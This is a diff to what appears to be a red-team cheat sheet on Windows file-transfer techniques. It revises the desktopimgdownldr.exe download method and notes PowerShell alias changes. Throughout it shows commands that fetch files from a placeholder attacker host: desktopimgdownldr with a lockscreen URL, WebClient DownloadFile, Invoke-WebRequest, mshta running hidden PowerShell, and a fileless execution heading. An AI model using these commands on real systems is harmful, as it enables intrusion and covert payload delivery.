@@ -128,11 +128,13 @@ certutil -decode encoded.txt decoded.exe
 ### desktopimgdownldr.exe (Windows 10 1803+ / Server 2019)
 ```cmd
 :: LOLBIN — originally for lock-screen wallpaper, abused for arbitrary HTTP(S) download
-:: Saves to %SystemRoot%\Temp\<FILENAME> by default
-set "DESKTOPIMAGEURL=http://<ATTACKER_IP>/<FILE>"
-cmd /c "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP /v DesktopImageUrl /t REG_SZ /d %DESKTOPIMAGEURL% /f && desktopimgdownldr.exe"
+:: SYSTEMROOT=<path> overrides default %SystemRoot% — file lands in <path>\Temp\<FILENAME>
+:: Without the override the file lands under the Personalization CSP cache (Themes\<random>.jpg)
+set "SYSTEMROOT=C:\Windows\Temp"
+cmd /c desktopimgdownldr.exe /lockscreenurl:http://<ATTACKER_IP>/<FILE> /eventName:desktopimgdownldr
 
-:: Less audited than certutil; HTTPS supported; runs under user context.
+:: Less audited than certutil; HTTPS supported. Note: writing PersonalizationCSP requires admin;
+:: the LOLBAS technique above only needs user context.
 ```
 
 ### tar.exe (Built-in since Windows 10 1803 / Server 2019)
@@ -161,7 +163,8 @@ mshta.exe vbscript:CreateObject("WScript.Shell").Run("powershell -nop -w hidden 
 # DownloadFile
 (New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>:<PORT>/<FILE>', 'C:\temp\<FILE>')
 
-# Invoke-WebRequest (alias: iwr, wget, curl in PS)
+# Invoke-WebRequest (aliases in Windows PowerShell 5.1: iwr, wget, curl;
+# in PowerShell 7+ the wget/curl aliases were removed — use `iwr` or full cmdlet name)
 Invoke-WebRequest -Uri 'http://<ATTACKER_IP>:<PORT>/<FILE>' -OutFile 'C:\temp\<FILE>'
 
 # Download and execute in memory (fileless)
